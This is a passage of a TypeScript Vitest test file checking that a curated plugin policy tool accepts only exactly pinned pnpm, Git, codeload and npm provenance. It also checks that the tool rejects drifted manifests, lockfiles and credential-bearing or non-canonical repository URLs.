        message: 'managed profile bundles must match the web-personal template in order',
      }))
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('ignores fallback artifact roots when a managed profile selects no candidates', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-enterprise-missing-'))
    const fallbackRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-enterprise-fallback-'))
    try {
      const profileRoot = materializeCuratedProfile('web-enterprise', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const catalog = loadCuratedCatalog()
      const fixtureCatalog = {
        ...catalog,
        candidates: catalog.candidates.map(candidate => ({ ...candidate })),
      }
      const candidates = fixtureCatalog.candidates.filter(candidate =>
        candidate.active
        && candidate.expectedPackage !== null
        && candidate.targetProfiles.includes('web-enterprise'))
      for (const candidate of candidates) {
        if (candidate.id === 'dsh-memento') {
          stageCandidatePackage(
            fallbackRoot,
            candidate.expectedPackage as string,
            undefined,
            {},
            undefined,
            candidate,
          )
          continue
        }
        stageCandidatePackage(
          profileRoot,
          candidate.expectedPackage as string,
          undefined,
          {},
          undefined,
          candidate,
        )
      }
      const catalogPath = join(home, 'catalog.json')
      writeFileSync(catalogPath, JSON.stringify(fixtureCatalog))

      const result = runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--artifact-root',
        fallbackRoot,
        '--json',
      ])
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; target?: string }>
      }

      expect(result.status).toBe(0)
      expect(payload.issues).toEqual([])
    } finally {
      rmSync(home, { recursive: true, force: true })
      rmSync(fallbackRoot, { recursive: true, force: true })
    }
  })

  it('fails closed for malformed or inconsistent managed profile selection', () => {
    const cases = [
      {
        name: 'profile name without prefix',
        manifest: { name: 'web-curated', dsh: { profile: { bundles: ['plugin-a'] } } },
        catalog: artifactCatalog(),
        message: 'managed profile name must use dsh-profile-<profile>',
      },
      {
        name: 'empty profile name suffix',
        manifest: { name: 'dsh-profile-', dsh: { profile: { bundles: ['plugin-a'] } } },
        catalog: artifactCatalog(),
        message: 'managed profile name must use dsh-profile-<profile>',
      },
      {
        name: 'non-array bundles',
        manifest: { name: 'dsh-profile-web-curated', dsh: { profile: { bundles: 'plugin-a' } } },
        catalog: artifactCatalog(),
        message: 'managed profile bundles must be a string array',
      },
      {
        name: 'non-string bundle',
        manifest: { name: 'dsh-profile-web-curated', dsh: { profile: { bundles: [1] } } },
        catalog: artifactCatalog(),
        message: 'managed profile bundles must be a string array',
      },
      {
        name: 'active candidate assigned elsewhere',
        manifest: { name: 'dsh-profile-web-research', dsh: { profile: { bundles: ['plugin-a'] } } },
        catalog: artifactCatalog(),
        message: 'plugin-a is not active and assigned to managed profile web-research',
      },
      {
        name: 'inactive requested candidate',
        manifest: { name: 'dsh-profile-web-curated', dsh: { profile: { bundles: ['plugin-a'] } } },
        catalog: artifactCatalog({
          active: false,
          targetProfiles: [],
          rejections: [{ code: 'inactive-fixture', evidence: 'fixture remains inactive' }],
        }),
        message: 'plugin-a is not active and assigned to managed profile web-curated',
      },
      {
        name: 'assigned candidate omitted from bundles',
        manifest: { name: 'dsh-profile-web-curated', dsh: { profile: { bundles: [] } } },
        catalog: artifactCatalog(),
        message: 'plugin-a is assigned to managed profile web-curated but not requested',
      },
    ] as const

    for (const testCase of cases) {
      const root = mkdtempSync(join(tmpdir(), 'dsh-curated-managed-profile-invalid-'))
      const catalogPath = join(root, 'catalog.json')
      try {
        writeFileSync(join(root, 'package.json'), JSON.stringify(testCase.manifest))
        writeFileSync(join(root, '.npmrc'), 'ignore-scripts=true\n')
        writeFileSync(catalogPath, testCase.catalog)

        const result = runVerifyLock([
          '--fixture',
          catalogPath,
          '--artifact-root',
          root,
          '--json',
        ])

        expect(result.status, testCase.name).toBe(1)
        expect(result.stdout, testCase.name).toContain(testCase.message)
      } finally {
        rmSync(root, { recursive: true, force: true })
      }
    }
  })

  it('uses normal pnpm install state as observed provenance across curated commands', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-pnpm-provenance-'))
    const repositoryDir = join(home, 'plugin.git')
    const profileRoot = join(home, 'profiles', 'fixture-curated')
    mkdirSync(repositoryDir, { recursive: true })
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(repositoryDir, 'package.json'), `${JSON.stringify({
      name: 'plugin-a',
      version: '1.0.0',
      type: 'module',
      main: './plugin.mjs',
      engines: { node: '^22.19.0 || >=24.0.0' },
      license: 'MIT',
      scripts: {},
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }, null, 2)}\n`)
    writeFileSync(join(repositoryDir, 'plugin.mjs'), 'export const name = "plugin-a"\nexport function apply() {}\n')
    writeFileSync(join(repositoryDir, 'cordis.patch.yml'), '- insert:\n    - id: plugin-a\n      name: ./plugin.mjs\n')
    expect(spawnSync('git', ['init', '--quiet', '--initial-branch=main'], { cwd: repositoryDir }).status).toBe(0)
    expect(spawnSync('git', ['add', 'package.json', 'plugin.mjs', 'cordis.patch.yml'], {
      cwd: repositoryDir,
    }).status).toBe(0)
    expect(spawnSync('git', [
      '-c',
      'user.name=DSH Test',
      '-c',
      'user.email=dsh-test@example.invalid',
      'commit',
      '--quiet',
      '-m',
      'fixture',
    ], { cwd: repositoryDir }).status).toBe(0)
    const commit = spawnSync('git', ['rev-parse', 'HEAD'], {
      cwd: repositoryDir,
      encoding: 'utf8',
    }).stdout.trim()
    const repository = 'https://github.com/example/plugin-a'
    const dependencySpec = `git+${repository}.git#${commit}`
    writeFileSync(join(profileRoot, 'package.json'), `${JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      private: true,
      dependencies: { 'plugin-a': dependencySpec },
      dsh: { profile: { bundles: ['plugin-a'] } },
    }, null, 2)}\n`)
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
    writeFileSync(join(profileRoot, 'pnpm-workspace.yaml'), 'packages:\n  - .\n')
    writeFileSync(join(profileRoot, '.npmrc'), 'ignore-scripts=true\n')
    const catalogPath = join(home, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      repository,
      commit,
      targetProfiles: ['fixture-curated'],
      resources: { entryIds: ['plugin-a'] },
    }))
    const install = spawnSync('corepack', [
      'pnpm@11.7.0',
      'install',
      '--reporter=append-only',
      '--store-dir',
      join(home, 'store'),
    ], {
      cwd: profileRoot,
      encoding: 'utf8',
      env: {
        ...process.env,
        GIT_CONFIG_COUNT: '1',
        GIT_CONFIG_KEY_0: `url.${pathToFileURL(repositoryDir).href}.insteadOf`,
        GIT_CONFIG_VALUE_0: `${repository}.git`,
      },
      timeout: 30_000,
    })
    expect(install.status, `${install.stdout}${install.stderr}`).toBe(0)
    expect(existsSync(join(profileRoot, 'node_modules/plugin-a/.dsh-curated-artifact.json'))).toBe(false)
    writeFixtureTreeSha(catalogPath, join(profileRoot, 'node_modules', 'plugin-a'))

    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      const installedCatalog = actual.loadCuratedCatalog(catalogPath)
      return {
        ...actual,
        loadCuratedCatalog: (path?: string) =>
          path === undefined ? installedCatalog : actual.loadCuratedCatalog(path),
      }
    })
    const commands = await import('../src/index.ts')
    try {
      const verify = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ])
      const preflight = commands.runPreflight(['--profile', 'fixture-curated', '--json'], {
        profileRoot,
      })
      const smoke = await commands.runSmokeProfile(['--profile', 'fixture-curated', '--json'], {
        profiles: { 'fixture-curated': { bundles: ['plugin-a'] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })

      expect(JSON.parse(verify.stdout)).toMatchObject({ ok: true, observed: true, issues: [] })
      expect(JSON.parse(preflight.stdout)).toMatchObject({ ok: true, observed: true, accepted: true, issues: [] })
      expect(JSON.parse(smoke.stdout)).toMatchObject({ ok: true, observed: true, issues: [] })

      const profileManifestPath = join(profileRoot, 'package.json')
      const rootLockPath = join(profileRoot, 'pnpm-lock.yaml')
      const installedLockPath = join(profileRoot, 'node_modules/.pnpm/lock.yaml')
      const installedManifestPath = join(profileRoot, 'node_modules/plugin-a/package.json')
      const installedMainPath = join(profileRoot, 'node_modules/plugin-a/plugin.mjs')
      const profileManifest = readFileSync(profileManifestPath, 'utf8')
      const rootLock = readFileSync(rootLockPath, 'utf8')
      const installedLock = readFileSync(installedLockPath, 'utf8')
      const installedManifest = readFileSync(installedManifestPath, 'utf8')
      const installedMain = readFileSync(installedMainPath, 'utf8')

      const exactInstalledManifest = JSON.parse(installedManifest) as Record<string, unknown>
      for (const drift of [
        {
          name: 'package version',
          code: 'artifact-package-version-mismatch',
          manifest: { ...exactInstalledManifest, version: '2.0.0' },
        },
        {
          name: 'license evidence',
          code: 'artifact-license-mismatch',
          manifest: { ...exactInstalledManifest, license: 'Apache-2.0' },
        },
        {
          name: 'dependency union',
          code: 'artifact-dependencies-mismatch',
          manifest: { ...exactInstalledManifest, dependencies: { unexpected: '1.0.0' } },
        },
        {
          name: 'lifecycle scripts',
          code: 'artifact-install-scripts-mismatch',
          manifest: { ...exactInstalledManifest, scripts: { prepare: 'node prepare.mjs' } },
        },
        {
          name: 'Node compatibility',
          code: 'artifact-node-engine-mismatch',
          manifest: { ...exactInstalledManifest, engines: { node: '>=99' } },
        },
        {
          name: 'bundle patch declaration',
          code: 'artifact-bundle-patch-missing',
          manifest: { ...exactInstalledManifest, dsh: { bundle: { patch: './other.patch.yml' } } },
        },
        {
          name: 'main entry',
          code: 'artifact-main-missing',
          manifest: { ...exactInstalledManifest, main: './missing.mjs' },
        },
      ]) {
        writeFileSync(installedManifestPath, JSON.stringify(drift.manifest))
        const verifyDrift = JSON.parse(commands.runVerifyLock([
          '--fixture',
          catalogPath,
          '--artifact-root',
          profileRoot,
          '--json',
        ]).stdout) as { issues: Array<{ code: string }> }
        const preflightDrift = JSON.parse(commands.runPreflight(['--profile', 'fixture-curated', '--json'], {
          profileRoot,
        }).stdout) as { issues: Array<{ code: string }> }
        const smokeDrift = JSON.parse((await commands.runSmokeProfile(['--profile', 'fixture-curated', '--json'], {
          profiles: { 'fixture-curated': { bundles: ['plugin-a'] } },
          profileRoot,
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
        })).stdout) as { issues: Array<{ code: string }> }
        for (const issues of [verifyDrift.issues, preflightDrift.issues, smokeDrift.issues]) {
          expect(issues, drift.name).toContainEqual(expect.objectContaining({ code: drift.code }))
        }
      }
      writeFileSync(installedManifestPath, installedManifest)

      const installedSidecarPath = join(profileRoot, 'node_modules/plugin-a/.dsh-curated-artifact.json')
      writeFileSync(installedSidecarPath, JSON.stringify({
        repository,
        commit,
        sourceContentSha256: fixtureShaA,
        changedPaths: [],
      }))
      const profileWithoutDependency = JSON.parse(profileManifest) as Record<string, unknown>
      delete profileWithoutDependency.dependencies
      writeFileSync(profileManifestPath, JSON.stringify(profileWithoutDependency))
      expect(JSON.parse(commands.runPreflight(['--profile', 'fixture-curated', '--json'], {
        profileRoot,
      }).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a is selected by the managed profile but absent from dependencies' }],
      })
      expect(JSON.parse((await commands.runSmokeProfile(['--profile', 'fixture-curated', '--json'], {
        profiles: { 'fixture-curated': { bundles: ['plugin-a'] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a is selected by the managed profile but absent from dependencies' }],
      })
      writeFileSync(profileManifestPath, profileManifest)
      unlinkSync(installedSidecarPath)

      writeFileSync(profileManifestPath, profileManifest.replace(`#${commit}`, '#main'))
      expect(JSON.parse(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a profile dependency must use a full Git commit SHA' }],
      })
      const externalArtifactRoot = join(home, 'external-artifacts')
      stageCandidatePackage(externalArtifactRoot, 'plugin-a')
      expect(JSON.parse(commands.runPreflight(['--profile', 'fixture-curated', '--json'], {
        profileRoot,
        artifactRoots: [externalArtifactRoot],
      }).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a profile dependency must use a full Git commit SHA' }],
      })
      writeFileSync(profileManifestPath, profileManifest)

      const malformedProfileManifest = JSON.parse(profileManifest) as {
        dependencies: Record<string, unknown>
      }
      malformedProfileManifest.dependencies['plugin-a'] = 1
      writeFileSync(profileManifestPath, JSON.stringify(malformedProfileManifest))
      expect(JSON.parse(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a profile dependency must be a non-empty string' }],
      })
      writeFileSync(profileManifestPath, profileManifest)

      writeFileSync(rootLockPath, rootLock.replace(
        `specifier: ${dependencySpec}`,
        `specifier: git+${repository}.git#${fixtureCommitC}`,
      ))
      expect(JSON.parse(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a pnpm dependency specifier differs from the profile manifest' }],
      })
      writeFileSync(rootLockPath, rootLock)

      unlinkSync(installedLockPath)
      expect(JSON.parse(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a requires root and installed pnpm lockfiles' }],
      })
      writeFileSync(installedLockPath, installedLock)

      writeFileSync(rootLockPath, rootLock.replace(`commit: ${commit}`, `commit: ${fixtureCommitC}`))
      expect(JSON.parse(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a root and installed pnpm resolutions differ' }],
      })
      writeFileSync(rootLockPath, rootLock)

      writeFileSync(rootLockPath, rootLock.replace("lockfileVersion: '9.0'", "lockfileVersion: '8.0'"))
      expect(JSON.parse(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a pnpm lockfile version must be 9.0' }],
      })
      writeFileSync(rootLockPath, rootLock)

      writeFileSync(rootLockPath, rootLock.replace('type: git', 'type: tarball'))
      expect(JSON.parse(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]).stdout)).toMatchObject({
        ok: false,
        issues: [{ message: 'plugin-a pnpm package resolution must be Git' }],
      })
      writeFileSync(rootLockPath, rootLock)

      const otherRepositoryLock = rootLock.replace(
        'repo: https://github.com/example/plugin-a.git',
        'repo: https://github.com/example/other.git',
      )
      expect(otherRepositoryLock).not.toBe(rootLock)
      writeFileSync(rootLockPath, otherRepositoryLock)
      writeFileSync(installedLockPath, installedLock.replace(
        'repo: https://github.com/example/plugin-a.git',
        'repo: https://github.com/example/other.git',
      ))
      expect(JSON.parse(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]).stdout)).toMatchObject({
        ok: false,
        issues: [{
          message: 'plugin-a pnpm lock resolution differs from the catalog repository, commit, or package path',
        }],
      })
      writeFileSync(rootLockPath, rootLock)
      writeFileSync(installedLockPath, installedLock)

      for (const { name, repositoryUrl, message, secret } of [
        {
          name: 'query',
          repositoryUrl: `${repository}.git?token=plain-query-secret`,
          message: 'Git repository must not contain credentials or query parameters',
          secret: 'plain-query-secret',
        },
        {
          name: 'username',
          repositoryUrl: repository.replace('https://', 'https://plain-user@') + '.git',
          message: 'Git repository must not contain credentials or query parameters',
          secret: 'plain-user',
        },
        {
          name: 'password',
          repositoryUrl: repository.replace('https://', 'https://plain-user:plain-password@') + '.git',
          message: 'Git repository must not contain credentials or query parameters',
          secret: 'plain-password',
        },
        {
          name: 'malformed URL',
          repositoryUrl: 'not-a-url',
          message: 'Git repository must be a canonical HTTPS GitHub URL',
          secret: undefined,
        },
        {
          name: 'HTTP URL',
          repositoryUrl: `${repository.replace('https:', 'http:')}.git`,
          message: 'Git repository must be a canonical HTTPS GitHub URL',
          secret: undefined,
        },
        {
          name: 'non-GitHub URL',
          repositoryUrl: 'https://gitlab.com/example/plugin-a.git',
          message: 'Git repository must be a canonical HTTPS GitHub URL',
          secret: undefined,
        },
        {
          name: 'extra path segment',
          repositoryUrl: `${repository}/nested.git`,
          message: 'Git repository must be a canonical HTTPS GitHub URL',
          secret: undefined,
        },
        {
          name: 'uppercase dot-git suffix',
          repositoryUrl: `${repository}.GIT`,
          message: 'Git repository must be a canonical HTTPS GitHub URL',
          secret: undefined,
        },
        {
          name: 'mixed-case dot-git suffix',
          repositoryUrl: `${repository}.Git`,
          message: 'Git repository must be a canonical HTTPS GitHub URL',
          secret: undefined,
        },
        {
          name: 'trailing slash',
          repositoryUrl: `${repository}/`,
          message: 'Git repository must be a canonical HTTPS GitHub URL',
          secret: undefined,
        },
        {
          name: 'mixed-case host',
          repositoryUrl: `${repository.replace('github.com', 'GitHub.com')}.git`,
          message: 'Git repository must be a canonical HTTPS GitHub URL',
          secret: undefined,
        },
      ] as const) {
        writeFileSync(profileManifestPath, profileManifest.replace(`${repository}.git`, repositoryUrl))
        writeFileSync(rootLockPath, rootLock.replaceAll(`${repository}.git`, repositoryUrl))
        writeFileSync(installedLockPath, installedLock.replaceAll(`${repository}.git`, repositoryUrl))
        const result = commands.runVerifyLock([
          '--fixture',
          catalogPath,
          '--artifact-root',
          profileRoot,
          '--json',
        ])

        expect(result.status, name).toBe(1)
        expect(result.stdout, name).toContain(message)
        if (secret !== undefined) expect(result.stdout, name).not.toContain(secret)
      }
      writeFileSync(profileManifestPath, profileManifest)
      writeFileSync(rootLockPath, rootLock)
      writeFileSync(installedLockPath, installedLock)

      writeFileSync(installedManifestPath, installedManifest.replace('"version": "1.0.0"', '"version": "2.0.0"'))
      const versionMismatch = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ])
      expect(commandIssues(versionMismatch)).toContainEqual(expect.objectContaining({
        code: 'artifact-package-version-mismatch',
        target: 'plugin-a',
      }))
      writeFileSync(installedManifestPath, installedManifest)

      const manifestWithoutMain = JSON.parse(installedManifest) as Record<string, unknown>
      delete manifestWithoutMain.main
      writeFileSync(installedManifestPath, JSON.stringify(manifestWithoutMain))
      const missingMainDeclaration = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ])
      expect(commandIssues(missingMainDeclaration)).toContainEqual(expect.objectContaining({
        code: 'artifact-main-missing',
        target: 'plugin-a',
      }))
      writeFileSync(installedManifestPath, installedManifest)

      unlinkSync(installedMainPath)
      const missingMainFile = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ])
      expect(commandIssues(missingMainFile)).toContainEqual(expect.objectContaining({
        code: 'artifact-main-missing',
        target: 'plugin-a',
      }))
      writeFileSync(installedMainPath, installedMain)
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  }, 45_000)

  it('accepts a direct Git runtime dependency with a package subdirectory', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-direct-git-path-'))
    const candidate = artifactCandidate({
      repositoryPath: 'packages/plugin-a',
      targetProfiles: ['fixture-curated'],
    })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      private: true,
      dsh: { profile: { bundles: ['plugin-a'] } },
    }))
    const packageDir = stageCandidatePackage(root, 'plugin-a', undefined, {}, undefined, candidate)
    stageManagedPnpmEvidence(root, candidate)
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      repositoryPath: candidate.repositoryPath,
      targetProfiles: candidate.targetProfiles,
      treeSha256: fixtureTreeSha256(packageDir),
      runtimeDependencyClosureSha256: candidate.runtimeDependencyClosureSha256,
    }))
    try {
      const result = runVerifyLockCommand(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
      })

      expect(result.status, result.stdout).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({ observed: true, issues: [] })
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('accepts only exact pnpm 11.7 GitHub codeload provenance across curated commands', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-codeload-provenance-'))
    const profileRoot = join(home, 'profile')
    const packageName = 'plugin-a'
    const repository = 'https://github.com/example/plugin-a'
    const repositoryPath = 'packages/plugin-a'
    const dependencySpec = `git+${repository}.git#${fixtureCommitB}&path:${repositoryPath}`
    const catalogPath = join(home, 'catalog.json')
    const candidate = artifactCandidate({
      repository,
      repositoryPath,
      targetProfiles: ['fixture-curated'],
    })
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      private: true,
      dependencies: { [packageName]: dependencySpec },
      dsh: { profile: { bundles: [packageName] } },
    }))
    writeFileSync(catalogPath, artifactCatalog({
      repository,
      repositoryPath,
      targetProfiles: ['fixture-curated'],
    }))
    const packageDir = stageCandidatePackage(profileRoot, packageName, undefined, {}, undefined, candidate)
    writeFixtureTreeSha(catalogPath, packageDir)

    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      const installedCatalog = actual.loadCuratedCatalog(catalogPath)
      return {
        ...actual,
        loadCuratedCatalog: (path?: string) =>
          path === undefined ? installedCatalog : actual.loadCuratedCatalog(path),
      }
    })
    const commands = await import('../src/index.ts')
    type CodeloadLockOptions = {
      readonly commit?: string
      readonly gitHosted?: boolean
      readonly host?: string
      readonly path?: string
      readonly tarballHost?: string
    }
    const writeCodeloadLocks = (options: CodeloadLockOptions = {}): void => {
      const commit = options.commit ?? fixtureCommitB
      const host = options.host ?? 'codeload.github.com'
      const path = options.path ?? repositoryPath
      const tarball = `https://${host}/example/plugin-a/tar.gz/${commit}`
      const locator = `${tarball}${path.length === 0 ? '' : `#path:${path}`}`
      const lock = {
        lockfileVersion: '9.0',
        ignoredBuiltDependencies: ['fixture'],
        importers: {
          '.': {
            dependencies: {
              [packageName]: {
                specifier: dependencySpec,
                version: `${locator}(fixture-peer@1.0.0)`,
              },
            },
          },
        },
        packages: {
          [`${packageName}@${locator}`]: {
            resolution: {
              ...options.gitHosted === false ? {} : { gitHosted: true },
              integrity: fixtureNpmIntegrity,
              ...path.length === 0 ? {} : { path },
              tarball: options.tarballHost === undefined
                ? tarball
                : tarball.replace(host, options.tarballHost),
            },
            version: '1.0.0',
          },
        },
      }
      const lockContent = JSON.stringify(lock)
      writeFileSync(join(profileRoot, 'pnpm-lock.yaml'), lockContent)
      mkdirSync(join(profileRoot, 'node_modules/.pnpm'), { recursive: true })
      writeFileSync(join(profileRoot, 'node_modules/.pnpm/lock.yaml'), lockContent)
    }
    const runObservedCommands = async (): Promise<CommandResult[]> => [
      commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        profileRoot,
        '--json',
      ]),
      commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot }),
      await commands.runSmokeProfile(['--profile', 'fixture-curated', '--json'], {
        profiles: { 'fixture-curated': { bundles: [packageName] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      }),
    ]

    try {
      writeCodeloadLocks()
      for (const result of await runObservedCommands()) {
        expect(JSON.parse(result.stdout)).toMatchObject({ ok: true, observed: true, issues: [] })
      }

      for (const testCase of [
        {
          name: 'wrong commit',
          options: { commit: fixtureCommitC },
          message: 'pnpm dependency version differs from the profile manifest',
        },
        {
          name: 'missing commit',
          options: { commit: '' },
          message: 'pnpm dependency version must use direct Git or GitHub codeload with a full commit SHA',
        },
        {
          name: 'wrong path',
          options: { path: 'packages/other' },
          message: 'pnpm dependency version differs from the profile manifest',
        },
        {
          name: 'missing path',
          options: { path: '' },
          message: 'pnpm dependency version differs from the profile manifest',
        },
        {
          name: 'wrong host',
          options: { host: 'downloads.example.com' },
          message: 'pnpm dependency version must use direct Git or GitHub codeload with a full commit SHA',
        },
        {
          name: 'missing gitHosted marker',
          options: { gitHosted: false },
          message: 'pnpm package resolution must be GitHub-hosted',
        },
        {
          name: 'mismatched package tarball',
          options: { tarballHost: 'downloads.example.com' },
          message: 'pnpm package tarball differs from its dependency version',
        },
      ] as const) {
        writeCodeloadLocks(testCase.options)
        for (const result of await runObservedCommands()) {
          expect(result.status, testCase.name).toBe(1)
          expect(result.stdout, testCase.name).toContain(testCase.message)
        }
      }
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('accepts only the exact audited npm version and integrity across curated commands', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-npm-provenance-'))
    const profileRoot = join(home, 'profile')
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const catalogPath = join(home, 'catalog.json')
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
      targetProfiles: ['fixture-curated'],
    })
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      private: true,
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
      targetProfiles: ['fixture-curated'],
    }))
    const packageDir = stageCandidatePackage(profileRoot, packageName, undefined, {}, undefined, candidate)
    writeFixtureTreeSha(catalogPath, packageDir)
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      private: true,
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))

    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      const installedCatalog = actual.loadCuratedCatalog(catalogPath)
      return {
        ...actual,
        loadCuratedCatalog: (path?: string) =>
          path === undefined ? installedCatalog : actual.loadCuratedCatalog(path),
      }
    })
    const commands = await import('../src/index.ts')
    const writeLocks = (integrity: string, importerVersion = npmVersion): void => {
      const lock = {
        lockfileVersion: '9.0',
        importers: {
          '.': {
            dependencies: {
              [packageName]: {
                specifier: npmVersion,
                version: importerVersion,
              },
            },
          },
        },
        packages: {
          [`${packageName}@${npmVersion}`]: {
            resolution: { integrity },
          },
        },
      }
      const lockContent = JSON.stringify(lock)
      writeFileSync(join(profileRoot, 'pnpm-lock.yaml'), lockContent)
      mkdirSync(join(profileRoot, 'node_modules/.pnpm'), { recursive: true })
      writeFileSync(join(profileRoot, 'node_modules/.pnpm/lock.yaml'), lockContent)
    }
    const mutateLocks = (mutate: (lock: Record<string, unknown>) => void): void => {
      for (const path of [
        join(profileRoot, 'pnpm-lock.yaml'),
        join(profileRoot, 'node_modules/.pnpm/lock.yaml'),
      ]) {
        const lock = JSON.parse(readFileSync(path, 'utf8')) as Record<string, unknown>
        mutate(lock)
        writeFileSync(path, JSON.stringify(lock))
      }
    }
    const verify = (): CommandResult => commands.runVerifyLock([
      '--fixture',
      catalogPath,
      '--artifact-root',
      profileRoot,
      '--json',
    ])
    const runObservedCommands = async (): Promise<CommandResult[]> => [
      verify(),
      commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot }),
      await commands.runSmokeProfile(['--profile', 'fixture-curated', '--json'], {
        profiles: { 'fixture-curated': { bundles: [packageName] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      }),
    ]

    try {
      writeLocks(npmIntegrity)
      for (const result of await runObservedCommands()) {
        expect(JSON.parse(result.stdout)).toMatchObject({ ok: true, observed: true, issues: [] })
      }

      writeLocks(npmIntegrity, `${npmVersion}(peer-package@2.0.0)`)
      for (const result of await runObservedCommands()) {
        expect(JSON.parse(result.stdout)).toMatchObject({ ok: true, observed: true, issues: [] })
      }

      writeLocks(npmIntegrity, `${npmVersion}(patch_hash=fixture)`)
      for (const result of await runObservedCommands()) {
        expect(result.status).toBe(1)
        expect(result.stdout).toContain('pnpm lockfile must not contain patched dependency locators')
      }

      writeLocks(npmIntegrity)
      mutateLocks((lock) => {
        lock.patchedDependencies = {
          [`${packageName}@${npmVersion}`]: {
            hash: 'fixture',
            path: 'patches/plugin-a.patch',
          },
        }
      })
      for (const result of await runObservedCommands()) {
        expect(result.status).toBe(1)
        expect(result.stdout).toContain('pnpm lockfile must not contain patchedDependencies')
      }

      writeLocks(npmIntegrity)
      mutateLocks((lock) => {
        lock.packageExtensions = {}
      })
      for (const result of await runObservedCommands()) {
        expect(result.status).toBe(1)
        expect(result.stdout).toContain('pnpm lockfile must not contain packageExtensions')
      }

      writeLocks(npmIntegrity)
      mutateLocks((lock) => {
        lock.settings = { overrides: { 'transitive-package': '9.9.9' } }
      })
      for (const result of await runObservedCommands()) {
        expect(result.status).toBe(1)
